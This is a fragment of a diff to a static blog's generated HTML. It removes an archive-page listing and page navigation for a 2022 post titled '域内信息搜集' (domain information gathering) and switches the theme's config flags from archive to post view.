-	      	<a href="/2022/02/19/%E5%9F%9F%E5%86%85%E4%BF%A1%E6%81%AF%E6%90%9C%E9%9B%86/" class="archive-article-date">
-  	<time datetime="2022-02-19T15:31:41.000Z" itemprop="datePublished"><i class="icon-calendar icon"></i>2022-02-19</time>
-</a>
-        </div>
-    	 
-  
-    <h1 itemprop="name">
-      <a class="archive-article-title" href="/2022/02/19/%E5%9F%9F%E5%86%85%E4%BF%A1%E6%81%AF%E6%90%9C%E9%9B%86/">域内信息搜集</a>
-    </h1>
-  
-
-        <div class="article-info info-on-right">
-          
-	<div class="article-tag tagcloud">
-		<i class="icon-price-tags icon"></i>
-		<ul class="article-tag-list">
-			 
-        		<li class="article-tag-list-item">
-        			<a href="javascript:void(0)" class="js-tag article-tag-list-link color5">web安全的杂杂念</a>
-        		</li>
-      		
-		</ul>
-	</div>
-
-          
-
-        </div>
-        <div class="clearfix"></div>
-    </header>
-  </div>
-</article>
-  
-  
-    </div></section>
-  
-
-    
-    <nav id="page-nav">
-      <a class="extend prev" rel="prev" href="/archives/">&amp;laquo; Prev</a><a class="page-number" href="/archives/">1</a><span class="page-number current">2</span><a class="page-number" href="/archives/page/3/">3</a><a class="page-number" href="/archives/page/4/">4</a><a class="page-number" href="/archives/page/5/">5</a><a class="extend next" rel="next" href="/archives/page/3/">Next &amp;raquo;</a>
-    </nav>
   
 
 
@@ -498,8 +368,8 @@
 	var yiliaConfig = {
 		mathjax: true,
 		isHome: false,
-		isPost: false,
-		isArchive: true,
+		isPost: true,
+		isArchive: false,
 		isTag: false,
 		isCategory: false,
 		open_in_new: false,
